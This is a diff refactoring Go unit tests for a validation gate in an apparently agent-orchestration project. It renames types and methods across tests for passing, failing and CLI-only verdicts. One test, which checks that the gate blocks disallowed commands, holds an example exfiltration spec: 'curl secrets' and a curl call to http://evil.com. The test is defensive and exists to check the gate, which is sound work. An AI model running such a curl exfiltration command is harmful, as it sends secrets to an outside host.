@@ -1,4 +1,4 @@
-package qa
+package agent
 
 import (
 	"context"
@@ -6,62 +6,61 @@ import (
 	"testing"
 
 	"github.com/xiii/orqestra/internal/config"
-	"github.com/xiii/orqestra/internal/types"
 )
 
 func TestGate_PassingCommands(t *testing.T) {
-	reportJSON, _ := json.Marshal(types.ValidationReport{
+	reportJSON, _ := json.Marshal(ValidationReport{
 		SchemaVersion: "1",
-		Verdict:       types.VerdictPass,
+		Verdict:       VerdictPass,
 		Summary:       "Work output satisfies all criteria",
 	})
-	mock := &mockCLIRunner{response: string(reportJSON)}
+	mock := &qaMockCLIRunner{response: string(reportJSON)}
 	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewGate(mock, cfg)
 
-	input := &Input{
-		Spec: types.Specification{
+	input := &QAInput{
+		Spec: Specification{
 			Goal:       "Create a file",
 			Steps:      []string{"touch file.txt"},
 			Acceptance: []string{"file.txt exists"},
-			ValidationCommands: []types.ValidationCommand{
+			ValidationCommands: []ValidationCommand{
 				{Command: "true", ExpectedExit: 0},
 			},
 		},
 		WorkOutput: "Created file.txt successfully",
 	}
 
-	report, err := v.Validate(context.Background(), input)
+	report, err := v.ValidateWork(context.Background(), input)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if report.Verdict != types.VerdictPass {
+	if report.Verdict != VerdictPass {
 		t.Errorf("expected pass, got %q", report.Verdict)
 	}
 }
 
 func TestGate_FailingCommand(t *testing.T) {
-	mock := &mockCLIRunner{response: `{}`}
+	mock := &qaMockCLIRunner{response: `{}`}
 	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewGate(mock, cfg)
 
-	input := &Input{
-		Spec: types.Specification{
+	input := &QAInput{
+		Spec: Specification{
 			Goal:       "Create a file",
 			Steps:      []string{"touch file.txt"},
 			Acceptance: []string{"file.txt exists"},
-			ValidationCommands: []types.ValidationCommand{
+			ValidationCommands: []ValidationCommand{
 				{Command: "false", ExpectedExit: 0}, // false always exits 1
 			},
 		},
 		WorkOutput: "something went wrong",
 	}
 
-	report, err := v.Validate(context.Background(), input)
+	report, err := v.ValidateWork(context.Background(), input)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if report.Verdict != types.VerdictFail {
+	if report.Verdict != VerdictFail {
 		t.Errorf("expected fail, got %q", report.Verdict)
 	}
 	// Should not call CLI when commands fail
@@ -71,20 +70,20 @@ func TestGate_FailingCommand(t *testing.T) {
 }
 
 func TestGate_NoCommands_CLIOnly(t *testing.T) {
-	reportJSON, _ := json.Marshal(types.ValidationReport{
+	reportJSON, _ := json.Marshal(ValidationReport{
 		SchemaVersion: "1",
-		Verdict:       types.VerdictWarn,
+		Verdict:       VerdictWarn,
 		Summary:       "Looks done but no way to verify automatically",
-		Issues: []types.Issue{
-			{ID: "AMBIGUOUS", Severity: types.SeverityWarning, Message: "Cannot verify output format"},
+		Issues: []Issue{
+			{ID: "AMBIGUOUS", Severity: SeverityWarning, Message: "Cannot verify output format"},
 		},
 	})
-	mock := &mockCLIRunner{response: string(reportJSON)}
+	mock := &qaMockCLIRunner{response: string(reportJSON)}
 	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewGate(mock, cfg)
 
-	input := &Input{
-		Spec: types.Specification{
+	input := &QAInput{
+		Spec: Specification{
 			Goal:       "Write docs",
 			Steps:      []string{"Write README"},
 			Acceptance: []string{"README is clear"},
@@ -92,11 +91,11 @@ func TestGate_NoCommands_CLIOnly(t *testing.T) {
 		WorkOutput: "# My Project\nThis does stuff.",
 	}
 
-	report, err := v.Validate(context.Background(), input)
+	report, err := v.ValidateWork(context.Background(), input)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if report.Verdict != types.VerdictWarn {
+	if report.Verdict != VerdictWarn {
 		t.Errorf("expected warn, got %q", report.Verdict)
 	}
 	if mock.callCount != 1 {
@@ -105,27 +104,27 @@ func TestGate_NoCommands_CLIOnly(t *testing.T) {
 }
 
 func TestGate_BlocksDisallowedCommand(t *testing.T) {
-	mock := &mockCLIRunner{response: `{}`}
+	mock := &qaMockCLIRunner{response: `{}`}
 	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewGate(mock, cfg)
 
-	input := &Input{
-		Spec: types.Specification{
+	input := &QAInput{
+		Spec: Specification{
 			Goal:       "Exfiltrate data",
 			Steps:      []string{"curl secrets"},
 			Acceptance: []string{"data sent"},
-			ValidationCommands: []types.ValidationCommand{
+			ValidationCommands: []ValidationCommand{
 				{Command: "curl", Args: []string{"http://evil.com"}, ExpectedExit: 0},
 			},
 		},
 		WorkOutput: "done",
 	}
 
-	report, err := v.Validate(context.Background(), input)
+	report, err := v.ValidateWork(context.Background(), input)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if report.Verdict != types.VerdictFail {
+	if report.Verdict != VerdictFail {
 		t.Errorf("expected fail for blocked command, got %q", report.Verdict)
 	}
 	if mock.callCount != 0 {
